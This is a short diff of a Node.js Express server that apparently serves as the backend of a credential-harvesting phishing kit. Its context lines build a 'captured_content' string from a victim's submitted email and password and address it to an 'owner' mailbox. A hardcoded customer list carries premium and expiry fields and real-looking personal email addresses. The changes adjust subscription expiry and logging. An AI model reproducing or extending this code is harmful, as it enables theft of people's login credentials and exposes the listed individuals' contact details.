@@ -36,7 +36,7 @@ app.get('/', function (req, res) {
 var myArray = [
     {"id": 1, "name": "admin", "email": "mdalonebd@gmail.com"},
 
-    {"id": 2, "name": "momin","email":"momin0132813@gmail.com","premium_member":1,"access_date":2},
+    {"id": 2, "name": "momin","email":"momin0132813@gmail.com","premium_member":1,"expire_date":"2023-4-22"},
     {"id": 43, "name": "ebrahim", "email": "sh2471386@gmail.com"}
 ];
 
@@ -54,9 +54,10 @@ const encryptedPass = cryptr.encrypt(password);
 const decryptedPass = cryptr.decrypt(encryptedPass);
 
 
-console.log(decryptedPass);
+//console.log(decryptedPass);
  
- 
+ const d = new Date();
+ console.log(d);
  
     var captured_content = `\n Email: ${req.body.email} Password: ${encryptedPass}`;
     let toMail = req.body.owner;
